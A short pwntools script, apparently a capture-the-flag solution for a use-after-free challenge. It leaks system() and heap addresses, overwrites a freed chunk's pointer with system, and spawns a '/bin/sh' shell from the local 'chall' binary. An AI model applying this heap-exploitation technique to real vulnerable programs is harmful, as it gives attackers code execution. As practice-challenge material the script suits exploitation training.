# https://blog.y2a.dev/articles/2022/05-02/uaf4b/
from pwn import *

context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

io = process("./chall")

io.recvuntil("<system> = ")
system_addr = int(io.recvline(), 16)

io.sendlineafter("> ", "2")
io.sendlineafter("Message: ", "/bin/sh")

io.sendlineafter("> ", "4")
io.recvuntil("cowsay->message")
message_addr = int(io.recvuntil("|")[:16], 16)
print(f'{message_addr:x}')

io.sendlineafter("> ", "3") # free
io.sendlineafter("> ", "2")     # fd ↓               # bk ↓
io.sendlineafter("Message: ", p64(system_addr) + p64(message_addr)) # system(/bin/sh)

io.sendlineafter("> ", "4")
io.sendlineafter("> ", "1")

io.interactive()
